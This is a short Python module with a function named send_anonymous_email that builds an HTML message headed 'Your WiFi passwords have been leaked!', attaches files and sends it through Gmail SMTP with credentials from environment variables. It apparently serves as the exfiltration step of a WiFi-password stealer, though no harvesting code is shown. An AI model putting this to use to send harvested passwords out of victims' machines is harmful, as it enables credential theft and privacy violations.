import os
import smtplib
import imghdr
from email.message import EmailMessage
from dotenv import load_dotenv

load_dotenv()

EMAIL_ADDRESS: str = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD: str = os.getenv("EMAIL_PASSWORD")


def send_anonymous_email(
    recipients: list,
    subject: str,
    text_content: str,
    attachments: list = [],
    ssl: bool = True,
    debug: bool = False,
) -> None:

    message = EmailMessage()
    message["From"] = EMAIL_ADDRESS
    message["To"] = recipients
    message["Subject"] = subject
    html_content = f"""
    <!DOCTYPE html>
    <html>
        <body>
            <h1>Your WiFi passwords have been leaked!</h1>
            <p>{text_content}</p>
        </body>
    </html>
    """
    message.set_content(html_content, subtype="html")

    for path in attachments:
        with open(path, "rb") as file:
            file_data = file.read()
            file_name = os.path.basename(path)
            subtype = os.path.splitext(path)[1]
            maintype = "image" if imghdr.what(path) else "application"

            message.add_attachment(
                file_data,
                maintype=maintype,
                subtype=subtype,
                filename=file_name,
            )

    if debug:
        """
        Run this command in background during debugging:
        $ python -m smtpd -c DebuggingServer -n localhost:1025
        """
        with smtplib.SMTP("localhost", 1025) as smtp:
            smtp.send_message(message)

    elif ssl:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(message)

    else:
        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(message)

    print("📧 Email was sent successfully!")
